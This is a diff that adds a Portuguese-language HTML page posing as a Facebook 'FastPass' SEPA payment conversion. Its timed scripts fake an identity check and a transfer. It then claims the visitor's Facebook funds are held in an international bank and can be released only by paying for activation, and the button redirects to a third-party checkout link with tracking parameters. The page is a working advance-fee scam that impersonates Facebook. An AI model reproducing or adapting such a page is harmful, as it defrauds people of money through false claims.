@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+
+<head>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "wnj6nzjur9");
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FastPass Facebook: Conversão Instantânea SEPA</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, Arial;
+      background: #f5f7fa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 380px;
+      background: #fff;
+      border-radius: 18px;
+      padding: 30px;
+      text-align: center;
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.08);
+    }
+
+    .icon {
+      font-size: 42px;
+      margin-bottom: 15px;
+    }
+
+    .title {
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .text {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    .loader {
+      width: 45px;
+      height: 45px;
+      border: 5px solid #eee;
+      border-top: 5px solid #1877F2;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 15px auto;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0)
+      }
+
+      100% {
+        transform: rotate(360deg)
+      }
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .success {
+      color: #16a34a;
+      font-weight: bold;
+    }
+
+    .warning {
+      background: #fff3cd;
+      color: #856404;
+      padding: 12px;
+      border-radius: 10px;
+      margin-top: 15px;
+      font-size: 14px;
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+    data-token="7d40c830-4300-4bad-a114-510741bc7700"></script>
+</head>
+
+<body>
+
+  <div class="card">
+
+    <!-- STEP 1 -->
+    <div id="step1">
+      <div class="icon">🤖</div>
+      <div class="title">A confirmar que é uma pessoa real.</div>
+      <div class="loader"></div>
+    </div>
+
+    <!-- STEP 2 -->
+    <div id="step2" class="hidden">
+      <div class="icon success">✔</div>
+      <div class="title">Verificação concluída</div>
+      <div class="text">A sua identidade foi confirmada com sucesso no Facebook.</div>
+    </div>
+
+    <!-- STEP 3 -->
+    <div id="step3" class="hidden">
+      <div class="icon">🌍</div>
+      <div class="title">A processar transferência internacional...</div>
+      <div class="loader"></div>
+    </div>
+
+    <!-- STEP 4 FINAL -->
+    <div id="step4" class="hidden">
+      <div class="icon">⚠️</div>
+      <div class="title">Ativação FastPass Necessária</div>
+
+      <div class="warning">
+        A transferência não pôde ser concluída porque os fundos estão num banco internacional.
+      </div>
+
+      <div class="text">
+        Detetámos que os seus fundos do Facebook estão numa conta internacional. Para libertar o pagamento agora, deve ativar o <strong>FastPass Facebook: Conversão Instantânea SEPA</strong> e validar a transferência global.
+      </div>
+
+      <div class="text">
+        Pode concluir este processo agora e receber o pagamento nos próximos minutos.
+      </div>
+
+      <div style="display:flex;justify-content:center;margin-top:15px;">
+
+        <a href="#" id="checkout-link" style="
+                display: inline-flex;
+                align-items: center;
+                justify-content: center;
+                text-decoration: none;
+                font-family: inherit;
+                font-weight: 600;
+                padding: 16px 24px;
+                font-size: 17px;
+                border-radius: 8px;
+                background-color: #1877F2;
+                color: #ffffff;
+                border: none;
+                width: 100%;
+                cursor: pointer;
+                text-align: center;
+            ">
+          Concluir conversão e libertar pagamento.
+        </a>
+
+      </div>
+
+    </div>
+
+  </div>
+
+  <script>
+    setTimeout(() => {
+      document.getElementById("step1").classList.add("hidden");
+      document.getElementById("step2").classList.remove("hidden");
+    }, 2000);
+
+    setTimeout(() => {
+      document.getElementById("step2").classList.add("hidden");
+      document.getElementById("step3").classList.remove("hidden");
+    }, 3500);
+
+    setTimeout(() => {
+      document.getElementById("step3").classList.add("hidden");
+      document.getElementById("step4").classList.remove("hidden");
+    }, 6000);
+
+    document.getElementById("checkout-link").addEventListener("click", function (e) {
+      e.preventDefault();
+      var search = window.location.search;
+      if (search.startsWith('?')) {
+        search = '&' + search.substring(1);
+      }
+      window.location.href = "https://waymb.com/c?username=eduardotreonix&product=2" + search;
+    });
+  </script>
+
+
+</body>
+
+</html>
